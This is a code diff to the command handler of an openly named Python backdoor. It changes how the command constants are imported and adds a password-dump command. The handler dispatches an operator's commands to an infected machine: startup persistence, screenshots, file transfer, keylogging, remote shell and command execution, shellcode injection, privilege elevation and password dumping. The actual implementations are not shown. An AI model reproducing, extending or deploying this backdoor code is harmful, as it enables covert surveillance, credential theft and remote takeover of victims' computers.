@@ -5,7 +5,7 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import src.definitions.commands as c
+from src.definitions.commands import *
 
 
 class CommandHandler:
@@ -17,38 +17,40 @@ class CommandHandler:
 
         _command = command["key"]
 
-        if _command == c.CLIENT_EXIT:
+        if _command == CLIENT_EXIT:
             self.control.close()
-        elif _command == c.CLIENT_ADD_STARTUP:
+        elif _command == CLIENT_ADD_STARTUP:
             self.control.add_startup()
-        elif _command == c.CLIENT_RMV_STARTUP:
+        elif _command == CLIENT_RMV_STARTUP:
             self.control.add_startup(True)
-        elif _command == c.CLIENT_SCREENSHOT:
+        elif _command == CLIENT_SCREENSHOT:
             self.control.screenshot()
-        elif _command == c.CLIENT_UPLOAD_FILE:
+        elif _command == CLIENT_UPLOAD_FILE:
             self.control.upload(command["value"]["buffer"], command["value"]["value"])
-        elif _command == c.CLIENT_RECV_FILE:
+        elif _command == CLIENT_RECV_FILE:
             self.control.receive(command["value"])
-        elif _command == c.CLIENT_LOCK:
+        elif _command == CLIENT_LOCK:
             self.control.lock()
-        elif _command == c.CLIENT_HEARTBEAT:
+        elif _command == CLIENT_HEARTBEAT:
             self.control.heartbeat()
-        elif _command == c.CLIENT_SHELL:
+        elif _command == CLIENT_SHELL:
             self.control.command_shell()
-        elif _command == c.CLIENT_PYTHON_INTERPRETER:
+        elif _command == CLIENT_PYTHON_INTERPRETER:
             self.control.python_interpreter()
-        elif _command == c.CLIENT_KEYLOG_START:
+        elif _command == CLIENT_KEYLOG_START:
             self.control.keylogger_start()
-        elif _command == c.CLIENT_KEYLOG_STOP:
+        elif _command == CLIENT_KEYLOG_STOP:
             self.control.keylogger_stop()
-        elif _command == c.CLIENT_KEYLOG_DUMP:
+        elif _command == CLIENT_KEYLOG_DUMP:
             self.control.keylogger_dump()
-        elif _command == c.CLIENT_RUN_CMD:
+        elif _command == CLIENT_RUN_CMD:
             self.control.run_command(command["value"])
-        elif _command == c.CLIENT_DISABLE_PROCESS:
+        elif _command == CLIENT_DISABLE_PROCESS:
             self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
-        elif _command == c.CLIENT_SHELLCODE:
+        elif _command == CLIENT_SHELLCODE:
             self.control.inject_shellcode(command["value"]["buffer"])
-        elif _command == c.CLIENT_ELEVATE:
+        elif _command == CLIENT_ELEVATE:
             self.control.elevate()
+        elif _command == CLIENT_PWD:
+            self.control.password_dump(command["value"])
 
